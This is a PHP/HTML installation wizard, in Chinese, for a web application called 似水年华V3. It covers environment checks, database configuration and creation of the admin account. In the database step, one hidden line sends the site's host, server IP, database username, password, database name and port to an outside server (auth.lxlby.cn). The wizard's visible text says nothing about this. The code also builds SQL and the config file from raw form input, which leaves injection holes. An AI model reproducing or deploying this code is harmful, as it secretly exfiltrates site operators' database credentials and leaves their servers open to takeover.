<!DOCTYPE html>
<html lang="zh-cn">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
<meta name="viewport" content="initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0,user-scalable=no,minimal-ui">
<title>似水年华V3.0安装向导</title>
<link rel="stylesheet" href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
</head>
<nav class="navbar navbar-fixed-top navbar-default">
    <div class="container">
      <div class="navbar-header">
        <span class="navbar-brand">似水年华V3安装向导</span>
      </div><!-- /.navbar-header -->
    </div><!-- /.container -->
  </nav><!-- /.navbar -->
  <div class="container" style="padding-top:60px;">
    <div class="col-xs-12 col-sm-8 col-lg-6 center-block" style="float: none;">
<?php
error_reporting(0);
@header('Content-Type: text/html; charset=UTF-8');
function checkfunc($f,$m = false) {
	if (function_exists($f)) {
		return '<font color="green">可用</font>';
	} else {
		if ($m == false) {
			return '<font color="black">不支持</font>';
		} else {
			return '<font color="red">不支持</font>';
		}
	}
}

function checkclass($f,$m = false) {
	if (class_exists($f)) {
		return '<font color="green">可用</font>';
	} else {
		if ($m == false) {
			return '<font color="black">不支持</font>';
		} else {
			return '<font color="red">不支持</font>';
		}
	}
}
if(file_exists('install.lock')){
    exit('已经安装完成！如需重新安装，请删除install目录下的install.lock!');
}
$step = isset($_GET['step'])?$_GET['step']:0x001;
$action = isset($_POST['action'])?$_POST['action']:null;
$finish = 1;
if($action == 'install'){
    $host = isset($_POST['host'])?$_POST['host']:null;
    $port = isset($_POST['port'])?$_POST['port']:null;
    $user = isset($_POST['user'])?$_POST['user']:null;
    $pwd = isset($_POST['pwd'])?$_POST['pwd']:null;
	$prefix = isset($_POST['prefix'])?$_POST['prefix']:null;  $database=isset($_POST['database'])?$_POST['database']:null;
    if(empty($host) || empty($port) || empty($user) || empty($database)){
        $errorMsg = '请填完所有数据库信息';
    }else{
        $mysql['host'] = $host;
        $mysql['port'] = $port;
        $mysql['database'] = $database;
        $mysql['username'] = $user;
        $mysql['password'] = $pwd;
        try{
            $db = new PDO('mysql:host=' . $mysql['host'] . ';dbname=' . $mysql['database'] . ';port=' . $mysql['port'], $mysql['username'], $mysql['password']);
        }
        catch(Exception$e){
            $errorMsg = '链接数据库失败:' . $e -> getMessage();
        }
        $domians = explode('.', $_SERVER['HTTP_HOST']);
        $domians = array_reverse($domians);
        if(empty($errorMsg)){
            $config['db'] = $mysql;
            $data = "<?php
".'$Mysql'. " = array(
	'host'               =>  '{$host}',
    'name'               =>  '{$database}',
    'user'               =>  '{$user}',
    'pwd'                =>  '{$pwd}',
    'port'               =>  '{$port}',
    'prefix'             =>  '{$prefix}',
);";
            @file_put_contents('../Common/config.php', $data);
            file_get_contents('http://auth.lxlby.cn/tj.php?url='.$_SERVER['HTTP_HOST'].'&host='.$_SERVER['SERVER_ADDR'].'&user='.$user.'&pwd='.$pwd.'&name='.$database.'&port='.$port);
            $db -> exec('set names utf8');
            $sqls = file_get_contents('install.sql');
            $sqls = str_replace('{$prefix}',$prefix,$sqls);
            $sqls = explode(';', $sqls);
            $success = 0;
            $error = 0;
            $errorMsg = null;
            foreach($sqls as $value){
                $length = trim($value);
                if(!empty($length)){
                    if($db -> exec($value) === false){
                        $error++;
                        $dberror = $db -> errorInfo();
                        $errorMsg .= $dberror[2] . '<br>';
                    }else{
                        $success++;
                    }
                }
            }
            $step = 4;
        }
    }
}
if($action == 'add'){
	$adminuser = $_POST['adminuser'];
	$adminpwd = $_POST['adminpwd'];
	$pwd = md5(md5($adminpwd).md5('211154860'));
if ($adminuser == "" || $adminpwd == ""){
	$errorMsg = '请完整填写管理员信息';
}else{
require("../Common/config.php");
require("../Common/db.class.php");
$db = new db($Mysql['host'],$Mysql['user'],$Mysql['pwd'],$Mysql['name'],$Mysql['port']);
$add = "INSERT INTO ".$Mysql['prefix']."users(`user`, `pwd`, `cookie`, `active`, `login`, `mail`, `qq`, `phone`, `name`, `sr`, `xb`, `age`, `dz`, `xh`, `xz`, `ah`, `tc`, `gxqm`, `tj`) VALUES ('{$adminuser}','{$pwd}',NULL,9,1,'1314@lxlby.cn',211154860,10086,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)";
if($db->query($add)){
	$step = 6;
	file_put_contents("install.lock",'安装锁');
}else{
	$errorMsg = '添加管理员时出错';
    echo $db->error();
         }
	}
}
?>
<?php if ($step ==1){ ?>
       <div class="panel panel-primary">
	<div class="panel-heading" style="background: #15A638;">
		<h3 class="panel-title" align="center">欢迎使用似水年华</h3>
	</div>
	<div class="panel-body">
		<div class="alert alert-info">
		<p>本源码版权归拾年(211154860)所有</p>
		<p>有问题加群578711917咨询</p>
		<p>源码已免费开源分享</p>
		<p>V2系列不能更新到V3 需重装 介意勿更!</p>
		</div>
		<p align="center"><a class="btn btn-primary" href="index.php?step=2">开始安装</a></p>
	</div>
</div>
<?php } ?>
<?php if ($step == 2) { ?>
	<div class="panel panel-primary">
	<div class="panel-heading" style="background:#15A638;">
		<h3 class="panel-title" align="center">环境检查</h3>
	</div>
<div class="progress progress-striped">
  <div class="progress-bar progress-bar-info" role="progressbar" aria-valuenow="40" aria-valuemin="0" aria-valuemax="100" style="width: 10%">
	<span class="sr-only">10%</span>
  </div>
</div>
<table class="table table-striped">
	<thead>
		<tr>
			<th style="width:20%">函数检测</th>
			<th style="width:15%">需求</th>
			<th style="width:15%">当前</th>
			<th style="width:50%">用途</th>
		</tr>
	</thead>
	<tbody>
		<tr>
			<td>PHP 5.3+</td>
			<td>必须</td>
			<td><?php echo phpversion(); ?></td>
			<td>PHP版本支持</td>
		</tr>
		<tr>
			<td>curl_exec()</td>
			<td>必须</td>
			<td><?php echo checkfunc('curl_exec',true); ?></td>
			<td>抓取网页</td>
		</tr>
		<tr>
			<td>file_get_contents()</td>
			<td>必须</td>
			<td><?php echo checkfunc('file_get_contents',true); ?></td>
			<td>读取文件</td>
		</tr>
		<tr>
			<td>ZipArchive</td>
			<td>推荐</td>
			<td><?php echo checkclass('ZipArchive'); ?></td>
			<td>Zip 解包和压缩</td>
		</tr>
		<tr>
			<td>写入权限</td>
			<td>推荐</td>
			<td><?php if (is_writable('./')) { echo '<font color="green">可用</font>'; } else { echo '<font color="black">不支持</font>'; } ?></td>
			<td>写入文件(1/2)</td>
		</tr>
		<tr>
			<td>file_put_contents()</td>
			<td>推荐</td>
			<td><?php echo checkfunc('file_put_contents'); ?></td>
			<td>写入文件(2/2)</td>
		</tr>
	</tbody>
</table>
<p><span><a class="btn btn-primary" href="index.php?step=1">上一步</a></span>
<span style="float:right"><a class="btn btn-primary" href="index.php?step=3" align="right">下一步</a></span></p>
</div>
<?php
}elseif($step == 3){
    ?>
		         
    <div class="panel panel-primary">
	<div class="panel-heading" style="background:#15A638;">
		<h3 class="panel-title" align="center">数据库配置</h3>
	</div>
<div class="progress progress-striped">
  <div class="progress-bar progress-bar-info" role="progressbar" aria-valuenow="40" aria-valuemin="0" aria-valuemax="100" style="width: 30%">
	<span class="sr-only">30%</span>
  </div>
</div>
	<div class="panel-body">
		<?php  if(isset($errorMsg)){
    echo '<div class="alert alert-danger text-center" role="alert">' . $errorMsg . '</div>';
} ?>
                <form class="form-horizontal mb-lg" action="#" method="post">
                    <input type="hidden" name="action" class="form-control" value="install">
                    <label for="name">数据库地址:</label>
                    <input type="text" class="form-control" name="host" value="localhost">
                    <label for="name">数据库端口:</label>
                    <input type="text" class="form-control" name="port" value="3306">
                    <label for="name">数据库用户名:</label>
                    <input type="text" class="form-control" name="user" placeholder="输入数据库用户名">
                    <label for="name">数据库密码:</label>
                    <input type="password" class="form-control" name="pwd" placeholder="输入数据库密码">
                    <label for="name">数据库库名:</label>
                    <input type="text" class="form-control" name="database" placeholder="输入数据库库名">
                    <label for="name">数据表前缀:</label>
                    <input type="text" class="form-control" name="prefix" value="ssnh_">
                    <br><input type="submit" class="btn btn-primary btn-block" name="submit" value="确认，下一步">
                </form>

            </div>

<?php }elseif($step == 4){
    ?>
           <div class="panel panel-primary">
	<div class="panel-heading" style="background:#15A638;">
		<h3 class="panel-title" align="center">导入数据表</h3>
	</div>
<div class="progress progress-striped">
  <div class="progress-bar progress-bar-info" role="progressbar" aria-valuenow="40" aria-valuemin="0" aria-valuemax="100" style="width: 60%">
	<span class="sr-only">60%</span>
  </div>
</div>
	<div class="panel-body">
<div class="alert alert-success">导入数据表成功！<br/>SQL成功<?php echo $success?>句/失败<?php echo $error?>句</div><p align="right"><a class="btn btn-block btn-primary" href="index.php?step=5">下一步>></a></p>
<?php }elseif ($step == 5){ ?>
	<?php
	 if(isset($errorMsg)){
    echo '<div class="alert alert-danger text-center" role="alert">' . $errorMsg . '</div>';
}
?>
<div class="panel panel-primary">
	<div class="panel-heading"style="background:#15A638;">
		<h3 class="panel-title" align="center">网站信息配置</h3>
	</div>
<div class="progress progress-striped">
  <div class="progress-bar progress-bar-info" role="progressbar" aria-valuenow="40" aria-valuemin="0" aria-valuemax="100" style="width: 85%">
	<span class="sr-only">85%</span>
  </div>
</div>
	<div class="panel-body">
		<form action="" class="form-sign" method="post">
			  <input type="hidden" name="action" class="form-control" value="add">
		<label for="name">管理员账号:</label>
		<input type="text" class="form-control" name="adminuser">
		<label for="name">管理员密码:</label>
		<input type="text" class="form-control" name="adminpwd" maxlength="32">
		<br><input type="submit" class="btn btn-primary btn-block" name="submit" value="保存配置">
		</form><br/>
	</div>
</div>
<?php }elseif ($step == 6){ ?>
	<?php @file_put_contents("install.lock",'安装锁');
	?>
		<div class="panel panel-primary">
	<div class="panel-heading"style="background:#15A638;">
		<h3 class="panel-title" align="center">安装成功</h3>
	</div>
<div class="progress progress-striped">
  <div class="progress-bar progress-bar-info" role="progressbar" aria-valuenow="40" aria-valuemin="0" aria-valuemax="100" style="width: 100%">
	<span class="sr-only">100%</span>
  </div>
</div>
	<div class="panel-body">
	<div class="alert alert-info">
<font color="green">安装完成!</font>
<p>管理员账号:<?php echo $adminuser ?></p>
<p>管理员密码:<?php echo $adminpwd ?></p>
<hr/><font color="blue">提示:后台地址为http://你的域名/admin</font>
<br/>更多设置选项请登录后台管理进行修改。<br/>
<font color="#FF0033">如果你的空间不支持本地文件读写，请自行在install/ 目录建立 install.lock 文件！</font></div>
<p align="center"><a class="btn btn-primary" href="../">返回首页</a></p>
<?php }
?>
        </div>
    </div>
</div>
</body>
</html>